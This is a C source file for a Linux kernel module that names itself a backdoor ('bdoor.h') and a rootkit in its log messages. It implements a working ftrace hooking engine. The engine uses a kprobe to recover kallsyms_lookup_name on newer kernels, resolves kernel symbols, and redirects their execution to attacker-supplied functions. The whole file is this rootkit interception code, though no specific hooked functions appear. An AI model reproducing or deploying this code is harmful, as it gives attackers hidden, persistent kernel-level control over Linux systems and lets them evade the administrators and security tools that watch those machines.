#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include "bdoor.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_namez;

#endif

int bdoor_init(void)
{
#ifdef KPROBE_LOOKUP
	register_kprobe(&kp);
	kallsyms_lookup_namez = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	return 0;
}

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	/*
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	*/
#ifdef KPROBE_LOOKUP
	hook->addr = kallsyms_lookup_namez(hook->name);
#else
	hook->addr = kallsyms_lookup_name(hook->name);
#endif

	if (!hook->addr)
	{
		printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->orig) = hook->addr;
#endif

	return 0;
}


static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
				struct ftrace_ops *ops, struct pt_regs *regs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long) hook->fun;
#else
	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long) hook->fun;
#endif
}

int fh_install_hook(struct ftrace_hook *hook)
{
	int err;
	err = fh_resolve_hook_address(hook);
	if(err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION_SAFE
		| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
		return err;
	}

	return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
	}
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0 ; i < count ; i++)
	{
		err = fh_install_hook(&hooks[i]);
		if(err)
			goto error;
	}
	return 0;

error:
	while (i != 0)
	{
		fh_remove_hook(&hooks[--i]);
	}
	return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0 ; i < count ; i++)
		fh_remove_hook(&hooks[i]);
}
